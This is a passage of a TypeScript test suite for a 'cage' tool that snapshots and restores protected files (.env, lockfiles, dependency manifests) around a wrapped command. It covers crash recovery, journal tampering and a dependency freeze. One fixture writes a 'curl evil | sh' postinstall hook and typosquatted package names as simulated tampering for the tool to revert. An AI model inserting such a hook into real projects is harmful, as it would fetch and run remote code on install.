  assert.equal(r.code, 3, wrapper.stderr());
  for (const pid of tree) assert.equal(pidAlive(pid), false, `pid ${String(pid)} of the tree was killed`);
  assert.equal(read(dest, ".env"), `${SECRET}\n`, ".env restored from the in-memory snapshot");
  assert.ok(!fs.existsSync(journalDir), "journal removed on clean signal shutdown");
  assert.match(wrapper.stderr(), /cage: trapped SIGTERM: terminated the command and its process tree/);
});

test("cage journal: kill -9 on the wrapper leaves a dirty journal; the next invocation kills the orphans and restores .env before spawning (MSN-0253 DoD 2, DoD 4)", POSIX_ONLY, async () => {
  const dest = makeRepo("og-cage-kill9-", true);
  const { wrapper, tree, journalDir } = await startTamperedSession(dest);
  process.kill(wrapper.proc.pid!, "SIGKILL");
  const r = await wrapper.exit;
  assert.equal(r.signal, "SIGKILL");
  assert.equal(read(dest, ".env"), "TOKEN=tampered\n", "an uncatchable kill leaves the tamper in place");
  assert.ok(fs.existsSync(path.join(journalDir, "journal.json")), "dirty journal left behind");
  assert.ok(tree.some(pidAlive), "the orphaned tree outlives the wrapper");

  const cli = path.join(getRepoRoot(), "dist", "cli", "index.js");
  const next = spawnSync(
    process.execPath,
    [cli, "cage", "--json", "--", ...nodeScript(`require("fs").writeFileSync("probe-env.txt", require("fs").readFileSync(".env", "utf8"));`)],
    { cwd: dest, encoding: "utf8", env: gitChildEnv() },
  );
  assert.equal(next.status, 0, next.stderr);
  assert.equal(read(dest, "probe-env.txt"), `${SECRET}\n`, ".env was restored before the wrapped command ran");
  const report = JSON.parse(next.stdout) as {
    recovery: { previous_pid: number; restored: { path: string; outcome: string }[]; orphans_killed: number[] } | null;
  };
  assert.ok(report.recovery, "report carries the recovery");
  assert.equal(report.recovery.previous_pid, wrapper.proc.pid);
  assert.ok(report.recovery.restored.some((c) => c.path === ".env" && c.outcome === "reverted"));
  assert.ok(report.recovery.orphans_killed.length >= 1, "orphaned descendant pids from the journal were killed");
  for (const pid of tree) assert.equal(pidAlive(pid), false, `orphan ${String(pid)} is dead`);
  assert.ok(!fs.existsSync(journalDir), "journal cleared after recovery");
  assert.match(next.stderr, /cage: recovered an interrupted session \(pid \d+/);
});

test("cage journal: tampered journal bytes make the next invocation refuse to start (exit 2, fail closed) (MSN-0253 DoD 5)", POSIX_ONLY, async () => {
  const dest = makeRepo("og-cage-corrupt-", true);
  const { wrapper, tree, journalDir } = await startTamperedSession(dest);
  process.kill(wrapper.proc.pid!, "SIGKILL");
  await wrapper.exit;
  try {
    fs.appendFileSync(path.join(journalDir, "journal.json"), " ");
    const cli = path.join(getRepoRoot(), "dist", "cli", "index.js");
    const next = spawnSync(
      process.execPath,
      [cli, "cage", "--", ...nodeScript(`require("fs").writeFileSync("probe-ran.txt", "ran");`)],
      { cwd: dest, encoding: "utf8", env: gitChildEnv() },
    );
    assert.equal(next.status, 2, next.stderr);
    assert.match(next.stderr, /GXT_CAGE_JOURNAL_CORRUPT/);
    assert.ok(!fs.existsSync(path.join(dest, "probe-ran.txt")), "the command never ran");
    assert.equal(read(dest, ".env"), "TOKEN=tampered\n", "nothing is restored from an untrusted journal");
    assert.ok(fs.existsSync(path.join(journalDir, "journal.json")), "the journal is kept for inspection");
  } finally {
    for (const pid of tree) {
      try {
        process.kill(pid, "SIGKILL");
      } catch {
        // already gone
      }
    }
  }
});

/** A repo with dependency manifests next to the lockfile, for the dependency freeze (MSN-0275). */
function makeDepsRepo(prefix: string): string {
  const dest = makeRepo(prefix, true);
  writeFile(dest, "package.json", "{\"name\":\"fixture\"}\n");
  writeFile(dest, "requirements-dev.txt", "pytest==8.0.0\n");
  writeFile(dest, "svc/go.mod", "module svc\n");
  return dest;
}

/** Add a dependency the way an agent would: lockfile, manifest, a new nested manifest and a requirements file. */
const DEPS_TAMPER = nodeScript(`
  const fs = require("fs");
  fs.writeFileSync("package-lock.json", "{\\"typosquat\\":1}\\n");
  fs.writeFileSync("package.json", "{\\"name\\":\\"fixture\\",\\"scripts\\":{\\"postinstall\\":\\"curl evil | sh\\"}}\\n");
  fs.mkdirSync("sub", { recursive: true });
  fs.writeFileSync("sub/package.json", "{\\"name\\":\\"new\\"}\\n");
  fs.writeFileSync("requirements-dev.txt", "pytest==8.0.0\\nreqeusts==1.0\\n");
`);

function assertDepsRestored(dest: string, report: Awaited<ReturnType<typeof runCage>>): void {
  assert.equal(report.dependencies, "revert");
  assert.equal(report.status, "violations_reverted");
  assert.equal(report.exit_code, 3);
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.rule, c.source, c.outcome]),
    [
      ["package-lock.json", "lockfile", "builtin", "reverted"],
      ["package.json", "dependency_manifest", "builtin", "reverted"],
      ["requirements-dev.txt", "dependency_manifest", "builtin", "reverted"],
      ["sub/package.json", "dependency_manifest", "builtin", "removed"],
    ],
  );
  assert.equal(read(dest, "package-lock.json"), "{}\n");
  assert.equal(read(dest, "package.json"), "{\"name\":\"fixture\"}\n");
  assert.equal(read(dest, "requirements-dev.txt"), "pytest==8.0.0\n");
  assert.equal(fs.existsSync(path.join(dest, "sub", "package.json")), false);
}

test("cage dependency freeze: .cage.yaml dependencies: revert restores lockfiles and manifests, removes new ones (MSN-0275 DoD 1, 3, 5)", async () => {
  const dest = makeDepsRepo("og-cage-deps-yaml-");
  writeFile(dest, ".cage.yaml", "dependencies: revert\n");
  assertDepsRestored(dest, await runCage({ cwd: dest, command: DEPS_TAMPER }));
});

test("cage dependency freeze: --lock-deps freezes without a .cage.yaml; the CLI says so at start and in JSON (MSN-0275 DoD 2, 4, 5)", async () => {
  const lib = makeDepsRepo("og-cage-deps-flag-");
  assertDepsRestored(lib, await runCage({ cwd: lib, lockDeps: true, command: DEPS_TAMPER }));
  const dest = makeDepsRepo("og-cage-deps-cli-");
  const r = runCli(dest, ["--lock-deps", "--json", "--", ...DEPS_TAMPER]);
  assert.equal(r.status, 3, r.stderr);
  assert.match(r.stderr, /^cage: watching \d+ protected file\(s\) \(dependencies frozen\)/m);
  const report = JSON.parse(r.stdout) as { dependencies: string; changes: { path: string; rule: string }[] };
  assert.equal(report.dependencies, "revert");
  assert.ok(report.changes.some((c) => c.path === "package.json" && c.rule === "dependency_manifest"));
  assert.ok(!r.stdout.includes("typosquat") && !r.stdout.includes("postinstall"), "digest-only report");
});

test("cage dependency freeze: off by default, lockfiles are kept and manifests are not protected (MSN-0275 DoD 3, 5)", async () => {
  const dest = makeDepsRepo("og-cage-deps-off-");
  const report = await runCage({ cwd: dest, command: DEPS_TAMPER });
  assert.equal(report.dependencies, "report");
  assert.equal(report.status, "ok");
  assert.deepEqual(report.changes.map((c) => [c.path, c.rule, c.outcome]), [["package-lock.json", "lockfile", "kept"]]);
  assert.equal(read(dest, "sub/package.json"), "{\"name\":\"new\"}\n");
  assert.equal(cageBasenameRule("package.json"), null);
  assert.equal(cageBasenameRule("package.json", "revert"), "dependency_manifest");
  assert.equal(cageBasenameRule("requirements.txt", "revert"), "dependency_manifest");
  assert.equal(cageBasenameRule("requirements-dev.txt", "revert"), "dependency_manifest");
  assert.equal(cageBasenameRule("requirements.in", "revert"), null);
  for (const name of ["pyproject.toml", "Pipfile", "Cargo.toml", "go.mod", "Gemfile", "composer.json"]) {
    assert.equal(cageBasenameRule(name, "revert"), "dependency_manifest", name);
  }
  const frozen = buildCagePlan(dest, { lockDeps: true });
  assert.deepEqual(classifyCagePath(frozen, "svc/go.mod"), { rule: "dependency_manifest", mode: "revert", overridden: false });
  assert.deepEqual(classifyCagePath(frozen, "Cargo.lock"), { rule: "lockfile", mode: "revert", overridden: false });
  assert.equal(classifyCagePath(buildCagePlan(dest), "svc/go.mod"), null);
});

test("cage dependency freeze: invalid values fail closed; dependencies: report and a report entry on a frozen path are handled (MSN-0275 DoD 1, 5)", async () => {
  for (const body of ["dependencies: maybe\n", "dependencies: true\n", "dependencies: [revert]\n"]) {
    const dest = makeDepsRepo("og-cage-deps-bad-");
    writeFile(dest, ".cage.yaml", body);
    await assert.rejects(
      runCage({ cwd: dest, command: nodeScript(`require("fs").writeFileSync("ran.txt", "1");`) }),
      (err: Error & { exitCode?: number; code?: string }) =>
        /top level: dependencies must be revert or report/.test(err.message) && err.exitCode === 2 && err.code === "GXT_CAGE_CONFIG_INVALID",
      body,
    );
    assert.equal(fs.existsSync(path.join(dest, "ran.txt")), false, `${body}: command must not run`);
  }
  const explicit = makeDepsRepo("og-cage-deps-report-");
  writeFile(explicit, ".cage.yaml", "dependencies: report\n");
  assert.equal((await runCage({ cwd: explicit, command: DEPS_TAMPER })).status, "ok", "report is the default and loosens nothing");
  const weaken = makeDepsRepo("og-cage-deps-weaken-");
  writeFile(weaken, ".cage.yaml", "dependencies: revert\nprotect:\n  - path: package.json\n    mode: report\n");
  await assert.rejects(runCage({ cwd: weaken, command: nodeScript("") }), /would weaken the built-in dependency_manifest rule/);
});

test("cage dependency freeze: an in-session .cage.yaml edit does not freeze the running session (MSN-0275 DoD 1, 5)", async () => {
  const dest = makeDepsRepo("og-cage-deps-insession-");
  const report = await runCage({
    cwd: dest,
    command: nodeScript(`
      const fs = require("fs");
      fs.writeFileSync(".cage.yaml", "dependencies: revert\\n");
      fs.writeFileSync("package.json", "{\\"name\\":\\"edited\\"}\\n");
      fs.writeFileSync("package-lock.json", "{\\"a\\":1}\\n");
    `),
  });
  assert.equal(report.dependencies, "report");
  const byPath = new Map(report.changes.map((c) => [c.path, c]));
  assert.equal(byPath.get(".cage.yaml")?.outcome, "removed", "the new config is itself removed");
  assert.equal(byPath.get("package-lock.json")?.outcome, "kept");
  assert.equal(byPath.has("package.json"), false);
  assert.equal(read(dest, "package.json"), "{\"name\":\"edited\"}\n");
});

test("cage dependency freeze: --allow-override keeps a frozen path's change, announced (MSN-0275 DoD 3, 5)", () => {
  const dest = makeDepsRepo("og-cage-deps-override-");
  const r = runCli(dest, [
    "--lock-deps",
    "--json",
    "--allow-override",
    "package-lock.json",
    "--",
    ...nodeScript(`require("fs").writeFileSync("package-lock.json", "{\\"a\\":1}\\n");`),
  ]);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stderr, /cage: OVERRIDE \(--allow-override\): changes are reported, not restored, under: package-lock\.json/);
  const report = JSON.parse(r.stdout) as { changes: Record<string, unknown>[] };
  assert.deepEqual(report.changes.map((c) => [c.path, c.rule, c.overridden, c.outcome]), [["package-lock.json", "lockfile", true, "kept"]]);
  assert.equal(read(dest, "package-lock.json"), "{\"a\":1}\n");
  const refused = runCli(makeDepsRepo("og-cage-deps-override-off-"), ["--allow-override", "package.json", "--", ...nodeScript("")]);
  assert.equal(refused.status, 2, "without the freeze package.json is not a revert target");
  assert.match(refused.stderr, /package\.json: matches no protected revert target/);
});

test("cage dependency freeze: kill -9 recovery rebuilds the frozen plan from the journal (MSN-0275 DoD 1, 3)", () => {
  const dest = fs.realpathSync(makeDepsRepo("og-cage-deps-journal-"));
  const snap = { keepBytes: true, maxFileBytes: 5 * 1024 * 1024, maxTotalBytes: 64 * 1024 * 1024 };
  const journalDir = resolveCageJournalDir(dest);
  // A wrapper that journals a frozen baseline and dies without cleaning up: its pid is dead afterwards.
  const lib = path.join(getRepoRoot(), "dist", "packages", "cage", "src");
  const writer = spawnSync(
    process.execPath,
    [
      "--input-type=module",
      "-e",
      `import { writeCageJournal } from ${JSON.stringify(path.join(lib, "cage-journal.js"))};
       import { buildCagePlan } from ${JSON.stringify(path.join(lib, "cage-rules.js"))};
       import { takeCageSnapshot } from ${JSON.stringify(path.join(lib, "cage-snapshot.js"))};
       const [root, dir, snap] = [process.argv[1], process.argv[2], JSON.parse(process.argv[3])];
       writeCageJournal(dir, root, takeCageSnapshot(buildCagePlan(root, { lockDeps: true }), snap), [], { lockDeps: true });`,
      dest,
      journalDir,
      JSON.stringify(snap),
    ],
    { encoding: "utf8", env: gitChildEnv() },
  );
  assert.equal(writer.status, 0, writer.stderr);
  const m = JSON.parse(fs.readFileSync(path.join(journalDir, "journal.json"), "utf8")) as { lock_deps: boolean };
  assert.equal(m.lock_deps, true);
  writeFile(dest, "package.json", "{\"name\":\"tampered\"}\n");
  writeFile(dest, "sub/package.json", "{\"name\":\"new\"}\n");
  const recovery = recoverCageJournal(dest, journalDir, snap);
  assert.ok(recovery, "the dirty journal was recovered");
  assert.deepEqual(
    recovery.restored.map((c) => [c.rel, c.outcome]),
    [
      ["package.json", "reverted"],
      ["sub/package.json", "removed"],
    ],
  );
  assert.equal(read(dest, "package.json"), "{\"name\":\"fixture\"}\n");
  assert.equal(fs.existsSync(path.join(dest, "sub", "package.json")), false);
});

test("cage: a .env.local created in the session is removed (MSN-0275 DoD 5)", async () => {
  const dest = makeRepo("og-cage-envlocal-", true);
  const report = await runCage({
    cwd: dest,
    command: nodeScript(`
      const fs = require("fs");
      fs.writeFileSync(".env.local", "TOKEN=agent\\n");
      fs.mkdirSync("apps/web", { recursive: true });
      fs.writeFileSync("apps/web/.env.production.local", "TOKEN=agent\\n");
    `),
  });
  assert.equal(report.exit_code, 3);
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.kind, c.rule, c.outcome]),
    [
      [".env.local", "added", "secrets", "removed"],
      ["apps/web/.env.production.local", "added", "secrets", "removed"],
    ],
  );
  assert.equal(fs.existsSync(path.join(dest, ".env.local")), false);
  assert.equal(fs.existsSync(path.join(dest, "apps", "web", ".env.production.local")), false);
});
